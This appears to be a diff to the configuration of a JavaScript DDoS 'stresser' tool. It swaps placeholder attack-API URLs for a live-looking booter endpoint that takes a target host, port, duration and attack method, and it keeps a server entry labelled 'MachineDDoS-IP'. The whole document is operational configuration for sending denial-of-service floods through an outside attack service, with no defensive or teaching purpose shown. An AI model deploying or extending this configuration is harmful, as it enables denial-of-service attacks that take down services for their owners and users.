@@ -49,19 +49,14 @@ swhite = '\u001b[0;37m';
 var timeout = ['50', '140', '124', '84', '520', '302', '410', '1002', '913', '20', '85', '623', '150', '943', '223', '221', '220', '2043', '10', '25', '704', '120', '80']
 
 var SimpleAPI = [
-"http://Simple-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
-"http://Simple-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
+"https://starlessstress.fun/a.php?key=heh&host={0}&port={1}&time={2}&method={3}"
 ];
 var NormalAPI = [
-"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
-"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
-"http://Normal-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
+"https://starlessstress.fun/a.php?key=heh&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var AdvancedAPI = [
-"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
-"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}",
-"http://Advanced-API/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
+"https://starlessstress.fun/a.php?key=heh&host={0}&port={1}&time={2}&method={3}"
 ];
 
 var servidorADM = [
@@ -69,7 +64,7 @@ var servidorADM = [
 "http://MachineDDoS-IP/api.php?key=DemonV3&host={0}&port={1}&time={2}&method={3}"
 ];
 
-var TEMPLATE = ["http://ipmaquina/api.php?key=ProibidoComunista&host={0}&port={1}&time={2}&method={3}"]
+var TEMPLATE = ["https://starlessstress.fun/a.php?key=heh&host={0}&port={1}&time={2}&method={3}"]
 
 var emoji = ['🆕']
 
